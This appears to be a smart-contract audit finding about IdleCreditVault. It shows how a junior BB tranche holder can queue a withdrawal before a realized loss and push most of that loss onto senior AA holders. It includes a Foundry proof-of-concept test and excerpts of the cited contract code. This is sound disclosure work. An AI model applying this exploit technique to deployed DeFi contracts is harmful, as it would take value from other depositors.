### Title
Queued BB withdrawals escape the junior-loss waterfall and shift realized losses to AA - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary

A BB holder can move junior capital into the pending-withdrawal bucket during the buffer period, removing its tranche identity before a loss is realized. `previewLossAdjustedWithdrawFunds` then applies the pending portion of the loss pro rata and sends the remainder to active holders; because the requester’s BB NAV was already burned, the residual loss falls on AA even though the queued claim originated from BB. [1](#0-0) [2](#0-1) 

### Finding Description

`requestWithdraw` only verifies the tranche, withdrawal flag, and wallet eligibility before burning the caller’s tranche tokens and reducing that tranche’s saved NAV. [1](#0-0)  In the strategy, the CDO’s principal-backed strategy tokens are burned and replaced by an aggregate user receipt, while the full request amount enters `pendingWithdraws` without recording whether it came from AA or BB. [3](#0-2) 

When a later `stopEpochWithDuration` carries a realized `_lossAmount`, `previewLossAdjustedWithdrawFunds` splits that loss between aggregate pending claims and aggregate active backing rather than preserving tranche seniority. [4](#0-3)  The funded pending amount is stored as a common recovery ratio by `collectWithdrawFunds`, while the remaining `activeLoss` is burned and crystallized through `_forceUpdateAccounting`. [5](#0-4) [6](#0-5) 

The active-side waterfall does apply losses to BB first, but that protection is ineffective for queued BB capital because `_withdrawOps` has already reduced `lastNAVBB`. [7](#0-6) [8](#0-7)  The result is that an unfunded BB receipt shares only its pro-rata portion of the loss while AA absorbs the remaining active-side loss.

For example, with 900 AA, 100 BB, zero fees, zero APR, and a later realized loss of 100, a whale can first request withdrawal of all 100 BB. `previewLossAdjustedWithdrawFunds` computes a pending loss of `100 * 100 / (900 + 100) = 10`, funds the BB receipt at 90, and assigns the remaining 90 to active NAV; since `lastNAVBB` is now zero, AA bears that 90. [2](#0-1)  Without the queued withdrawal, the same 100 loss would have exhausted BB first and left AA’s 900 basis intact. [7](#0-6) 

### Impact Explanation

This is a direct redistribution of loss rather than only a temporary withdrawal delay: the queued BB holder recovers 90 in the example while AA loses 90 NAV that should have remained protected behind the 100 BB first-loss layer. [9](#0-8)  More generally, a BB requester can transfer `activeLoss` to remaining holders by converting junior NAV into an identity-less pending claim before the loss is crystallized. [10](#0-9) [11](#0-10) 

### Likelihood Explanation

The attacker only needs to be an allowed BB holder and submit a normal `requestWithdraw` while withdrawal requests are enabled between epochs. [12](#0-11)  The subsequent `stopEpochWithDuration` call is an honest manager action realizing an actual loss, and none of KYC, accounting refresh, withdrawal flags, recovery-price checks, or the active BB-first waterfall restores the queued claim’s junior status. [13](#0-12) [5](#0-4)  Likelihood is constrained by the timing requirement: the withdrawal must be queued during a buffer period before the relevant loss is crystallized.

### Recommendation

Preserve tranche identity for queued withdrawal claims and apply realized losses to the combined BB basis before touching AA. Track `pendingWithdrawsByEpoch` separately for AA-origin and BB-origin receipts, calculate recovery ratios per class, and prevent one aggregate receipt pool from obscuring first-loss capital. [14](#0-13) [2](#0-1) 

If preserving identity is not feasible, restrict full BB withdrawal requests while a realized but uncrystallized loss can still affect the queue, or apply loss to BB-origin receipts through a conservative aggregate ordering rule before assigning residual loss to AA. [1](#0-0) 

### Proof of Concept

Insert this test into the existing `test/foundry/IdleCreditVault.t.sol` fixture, using KYC-approved users and configuring zero APR, performance fee, and management fee for clarity.

```solidity
function testQueuedBBWithdrawShiftsLossToAA() external {
    uint256 aaAmount = 900 * ONE_SCALE;
    uint256 bbAmount = 100 * ONE_SCALE;
    uint256 lossAmount = bbAmount;

    address aaUser = makeAddr("aa-user");
    address bbWhale = makeAddr("bb-whale");

    deal(defaultUnderlying, aaUser, aaAmount);
    deal(defaultUnderlying, bbWhale, bbAmount);

    vm.startPrank(aaUser);
    underlying.approve(address(idleCDO), aaAmount);
    idleCDO.depositAA(aaAmount);
    vm.stopPrank();

    vm.startPrank(bbWhale);
    underlying.approve(address(idleCDO), bbAmount);
    idleCDO.depositBB(bbAmount);
    vm.stopPrank();

    vm.prank(manager);
    IdleCreditVault(address(strategy)).setAprs(0, 0);

    // Buffer phase: convert all active BB NAV into an identity-less pending claim.
    vm.prank(bbWhale);
    uint256 requested = cdoEpoch.requestWithdraw(0, address(BBtranche));

    assertEq(requested, bbAmount);
    assertEq(cdoEpoch.lastNAVBB(), 0);
    assertEq(IdleCreditVault(address(strategy)).pendingWithdraws(), bbAmount);

    _startEpochAndCheckPrices(0);

    (uint256 pendingToFund, uint256 activeLoss) =
        IdleCreditVault(address(strategy)).previewLossAdjustedWithdrawFunds(lossAmount);

    assertEq(pendingToFund, 90 * ONE_SCALE);
    assertEq(activeLoss, 90 * ONE_SCALE);

    vm.warp(cdoEpoch.epochEndDate() + 1);
    deal(defaultUnderlying, borrower, pendingToFund);
    vm.prank(borrower);
    underlying.approve(address(cdoEpoch), pendingToFund);

    uint256 duration = cdoEpoch.epochDuration();
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(0, 0, duration, lossAmount);

    // The queued BB receipt is funded at 90%, while AA bears the other 90 loss.
    assertApproxEqAbs(
        cdoEpoch.virtualPrice(address(AAtranche)),
        9 * ONE_SCALE / 10,
        2
    );
    assertEq(cdoEpoch.virtualPrice(address(BBtranche)), 0);

    uint256 balBefore = underlying.balanceOf(bbWhale);
    vm.prank(bbWhale);
    cdoEpoch.claimWithdrawRequest();

    assertApproxEqAbs(
        underlying.balanceOf(bbWhale) - balBefore,
        90 * ONE_SCALE,
        2
    );

    // Contrast: if the whale had not queued its BB, the same 100 loss would
    // exhaust BB first and leave AA's 900 NAV intact.
}
```

### Citations

**File:** contracts/IdleCDOEpochVariant.sol (L496-500)
```text
      if (_lossAmount != 0) {
        _strategy.burnStrategyTokens(_lossAmount);
        // Realize the active loss immediately through the ordinary BB-first waterfall.
        _forceUpdateAccounting();
      }
```

**File:** contracts/IdleCDOEpochVariant.sol (L520-529)
```text
  function stopEpochWithDuration(uint256 _newApr, uint256 _interest, uint256 _duration, uint256 _lossAmount) public {
    // stop epoch checks that msg.sender is allowed
    _stopEpoch(_newApr, _interest, _lossAmount);
    if (_interest != 1 && !defaulted) {
      // buffer period is not changed
      setEpochParams(_duration, bufferPeriod);
      // scale the apr with the new duration and buffer
      _setScaledApr(_newApr);
    }
    _afterStopEpochWithDuration();
```

**File:** contracts/IdleCDOEpochVariant.sol (L739-790)
```text
  function requestWithdraw(uint256 _amount, address _tranche) external returns (uint256 _underlyings) {
    _checkTranche(_tranche);
    _checkNotAllowed(
      (_tranche == AATranche ? !allowAAWithdrawRequest : !allowBBWithdrawRequest) ||
      !isWalletAllowed(msg.sender)
    );
  
    // we check if there are donated assets to the pool and transfer them to the feeReceiver if any
    _skimDonatedAssets();

    // we trigger an update accounting to check for eventual losses
    _updateAccounting();

    IdleCreditVault creditVault = IdleCreditVault(strategy);
    if (_amount == 0) {
      _amount = _userTrancheBal(msg.sender, _tranche);
    }
    _underlyings = _trancheToUnderlyings(_amount, _tranche);

    // Programmable borrower deployments do not support instant withdrawals.
    // If apr decresed wrt last epoch, request instant withdraw and burn tranche tokens directly
    // we compare unscaled aprs
    if (_isInstantWithdrawEnabled()) {
      uint256 currentApr = creditVault.unscaledApr();
      if (lastEpochApr > (currentApr + instantWithdrawAprDelta)) {
        // burn strategy tokens from cdo and mint an equal amount to msg.sender as receipt
        creditVault.requestInstantWithdraw(_underlyings, msg.sender);
        // burn tranche tokens and decrease NAV
        _withdrawOps(_amount, _underlyings, _tranche);
        return _underlyings;
      }
    }

    uint256 principal = _underlyings;
    (uint256 interest, int256 diff) = _calcInterestWithdrawRequest(_underlyings, _tranche);
    uint256 totalFees = _totalWithdrawFees(principal, interest);
    // user is requesting principal + interest minus upfront management fee and net performance fee
    _underlyings = principal + interest - totalFees;
    // add expected fees to pending withdraw fees counter
    pendingWithdrawFees += totalFees;

    /// if there is an AA withdrawal the overperformance that the amount withdrawed would have generated for BB tranches
    /// is saved in interestForOverUnderPerformance. This is used to calculate the interest that should be added to the
    /// expectedEpochInterest at the startEpoch.
    /// If there is a BB withdrawal this amount is subtracted from the expectedEpochInterest
    interestForOverUnderPerformance += diff;

    // The receipt is fixed now and leaves live NAV. Charge management fees upfront
    // for the time it waits outside live NAV: remaining buffer plus the next epoch.
    creditVault.requestWithdraw(_underlyings, msg.sender, principal);
    // burn tranche tokens and decrease NAV without interest for the next epoch as it was not yet counted in NAV
    _withdrawOps(_amount, principal, _tranche);
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L243-294)
```text
  function requestWithdraw(uint256 _amount, address _user, uint256 _principal) external {
    _onlyIdleCDO();
    _ensureDefaultRecoveryInitialized();
    if (_amount == 0) return;
    if (defaultRecoveryFinalized) {
      // user should first claim old already-funded withdraw requests before requesting new ones after default
      if (_hasWithdrawRequest(_user) || instantWithdrawsRequests[_user] != 0 || postDefaultRequests[_user] != 0) {
        revert NotAllowed();
      }
      // Preserve request/claim UX after default without increasing borrower-facing pendingWithdraws.
      // The CDO passes an already-haircut amount because finalization lowered virtualPrice first.
      _burn(msg.sender, _amount);
      _mint(_user, _amount);
      postDefaultRequests[_user] = _amount;
      return;
    }
    bool isClosed = IIdleCDOEpochVariant(idleCDO).epochEndDate() == 0;
    uint256 currentEpoch = epochNumber;
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (
      lossRecoveryPrice != 0 &&
      (withdrawsRequestsByEpoch[_user][lossEpoch] != 0 ||
      (apr0Users[_user].principal != 0 && apr0Users[_user].principalEpoch == lossEpoch))
    ) {
      // A loss-adjusted receipt must be claimed before opening a later request, otherwise
      // `lastWithdrawRequest` would stop pointing to the epoch that stores its haircut.
      revert NotAllowed();
    }
    // burn strategy tokens from cdo (we don't burn future interest here, only the principal)
    _burn(msg.sender, _principal);
    // mint equal amount of strategy tokens to the user as receipt (interest included), useful in case of default
    _mint(_user, _amount);
    // A successfully closed pool already recalled all funds and has no later stopEpoch.
    if (!isClosed) {
      // Global amount that stopEpoch must source from borrower/strategy for all pending receipts.
      pendingWithdraws += _amount;
    }
    // save the epoch of the last withdraw request (buffer + epochDuration is 1 epoch)
    lastWithdrawRequest[_user] = currentEpoch;
    // APR=0 requests keep separate accounting and settle interest at stopEpoch.
    // `_amount` here is the post-management-fee principal bucket for that flow.
    if (unscaledApr == 0 && !isClosed) {
      _requestWithdrawApr0(_amount, _user);
    } else {
      // increase the withdraw requests for the user
      // we record both per-user (old, kept for compatibility) and per-epoch so
      // on finalization we can distinguish "default-epoch pending receipts"
      // from old funded receipts.
      withdrawsRequests[_user] += _amount;
      withdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L411-429)
```text
  function collectWithdrawFunds(uint256 _amount) external {
    _onlyIdleCDO();
    uint256 pendingBasis = pendingWithdraws;
    if (_amount < pendingBasis) {
      // Legacy receipts do not have per-epoch ownership data, so they can only be fully funded.
      if (!defaultRecoveryInitialized) revert NotAllowed();
      uint256 lossRecoveryPrice = _amount * RECOVERY_FULL / pendingBasis;
      // Avoid storing a zero price, which is indistinguishable from "no loss-adjusted epoch".
      if (lossRecoveryPrice == 0) revert NotAllowed();
      pendingWithdraws = 0;
      lossRecoveryPriceByEpoch[epochNumber] = lossRecoveryPrice;
    } else {
      // A plain implementation upgrade may leave legacy normal receipts pending. Their next
      // successful stop can fully fund the aggregate before lazy initialization occurs.
      pendingWithdraws = pendingBasis - _amount;
    }
    if (_amount != 0) {
      underlyingToken.safeTransferFrom(idleCDO, address(this), _amount);
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L432-459)
```text
  /// @notice Preview how a realized stop-epoch loss is split between active LPs and pending receipts.
  /// @dev Without pending receipts, a loss cannot exceed its active basis. When pending receipts
  /// exist, all pending receipts share their aggregate portion of the loss pro rata because the
  /// pending bucket does not retain tranche identity. The remaining active loss is later applied
  /// by the CDO through its ordinary BB-first waterfall.
  /// @param _lossAmount realized loss amount
  /// @return pendingToFund amount of pending withdrawals that should be funded by the borrower
  /// @return activeLoss amount of loss that remains assigned to active LPs
  function previewLossAdjustedWithdrawFunds(uint256 _lossAmount) external view returns (uint256 pendingToFund, uint256 activeLoss) {
    uint256 pendingBasis = pendingWithdraws;
    // Full zero-loss funding is safe for legacy aggregate receipts and needs no migration call.
    if (_lossAmount == 0) return (pendingBasis, _lossAmount);

    IIdleCDOEpochVariant cdo = IIdleCDOEpochVariant(idleCDO);
    uint256 activeBasis = _lossActiveBasis(cdo);
    if (pendingBasis == 0) {
      if (_lossAmount > activeBasis) revert NotAllowed();
      return (0, _lossAmount);
    }

    // Legacy pending receipts do not have the per-epoch ownership data needed to store a haircut.
    if (!defaultRecoveryInitialized) revert NotAllowed();
    uint256 totalBasis = activeBasis + pendingBasis;
    if (_lossAmount >= totalBasis) revert NotAllowed();

    uint256 pendingLoss = _lossAmount * pendingBasis / totalBasis;
    pendingToFund = pendingBasis - pendingLoss;
    activeLoss = _lossAmount - pendingLoss;
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L789-800)
```text
  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);
```

**File:** contracts/IdleCDOCreditVault.sol (L329-333)
```text
      } else {
        int256 maxBBLoss = -int256(lastNAVBB);
        int256 totalBBLoss = totalGain > maxBBLoss ? totalGain : maxBBLoss;
        _totalTrancheGain = _isAATranche ? totalGain - totalBBLoss : totalBBLoss;
      }
```

**File:** contracts/IdleCDOCreditVault.sol (L369-381)
```text
  function _withdrawOps(uint256 _amount, uint256 _underlyings, address _tranche) internal {
    // burn tranche token
    IdleCDOTranche(_tranche).burn(msg.sender, _amount);

    // update NAV with the _amount of underlyings removed
    if (_tranche == AATranche) {
      lastNAVAA -= _underlyings;
    } else {
      lastNAVBB -= _underlyings;
    }

    // update trancheAPRSplitRatio
    _updateSplitRatio(_getAARatio(true));
```
